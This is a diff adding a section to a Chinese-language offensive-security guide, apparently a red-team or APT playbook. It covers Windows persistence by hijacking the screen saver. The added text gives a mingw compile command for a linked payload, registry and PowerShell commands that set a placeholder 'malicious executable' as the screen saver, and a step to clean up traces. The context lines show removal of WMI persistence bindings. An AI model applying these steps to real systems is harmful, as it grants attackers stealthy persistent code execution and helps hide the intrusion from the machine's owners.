@@ -984,3 +984,30 @@ Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filt
 # 移除绑定
 Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter='__EventFilter.Name=\"PersistenceFilter\"' AND Consumer='CommandLineEventConsumer.Name=\"PersistenceConsumer\"'" | Remove-WmiObject
 ```
+
+### 劫持屏幕保护程序
+
+[desktop.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/desktop.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 desktop.cpp -o desktop.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```Bash
+终端命令
+reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
+reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /d 10
+reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d 恶意可执行程序路径
+
+PowerShell命令
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value '恶意可执行程序路径' -PropertyType String -Force
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive' -Value '1' -PropertyType String -Force
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverTimeout' -Value '60' -PropertyType String -Force
+
+查看当前配置的屏幕保护程序
+Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE'
+
+清理痕迹
+Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'ScreenSaveTimeOut'
+Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'SCRNSAVE.EXE'
+```
